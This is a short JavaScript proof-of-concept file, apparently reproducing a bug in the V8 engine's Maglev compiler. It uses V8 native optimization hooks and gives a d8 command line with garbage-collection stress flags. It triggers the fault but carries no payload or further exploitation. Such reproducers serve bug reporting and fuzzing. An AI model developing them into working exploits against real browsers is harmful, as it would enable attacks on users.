function opt_me() {
    const args = arguments;
    
    const obj = {"f": args};

    try { 
        opt_me(args, 1);
    } catch (e) {
        print("error");
    }
    
    const slice = Array.prototype.slice;
    slice.apply(args);
}

%PrepareFunctionForOptimization(opt_me);
opt_me();
%OptimizeMaglevOnNextCall(opt_me);
opt_me();
//./d8 \--allow-natives-syntax \--stress-gc-during-compilation \--stress-incremental-marking \--predictable-gc-schedule \--predictable \--maglev-pretenure-store-values \./poc.js